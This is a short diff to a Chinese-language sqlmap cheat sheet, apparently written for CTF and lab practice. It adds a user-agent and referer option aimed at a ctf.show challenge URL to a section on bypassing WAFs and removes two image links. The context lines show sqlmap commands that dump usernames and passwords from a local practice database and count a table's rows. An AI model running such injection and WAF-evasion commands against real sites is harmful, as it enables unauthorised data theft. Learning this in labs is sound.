@@ -133,7 +133,8 @@ password字段可能会顺带解密
 ## **绕过防护**
 ```
 --random-agent  随机UA，防止WAF
-
+--user-agent sqlmap 
+--referer http://9.challenge.ctf.show/sqlmap.php
 
 绕过WAF,修改注入数据格式：
 sqlmap的tamper/文件中自带脚本
@@ -181,7 +182,7 @@ sqlmap -u "http://localhost:30008/" --data="id=1"
 sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dump -C'id,username,password' -T 'users' -D 'security' --start=1 --stop=5
 ```
 
-![](https://0b4e0933.sqlsec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0/imgs/image-20200721213636280.png)
+
 
 如果要证明某个表下面的数量的话，直接使用 sqlmap 的 `--count` 参数即可
 
@@ -189,4 +190,3 @@ sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dump -C'id,username,password' -
 sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --count -T 'users' -D 'security'
 ```
 
-![image-20200721213755305](https://0b4e0933.sqlsec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0/imgs/image-20200721213755305.png)
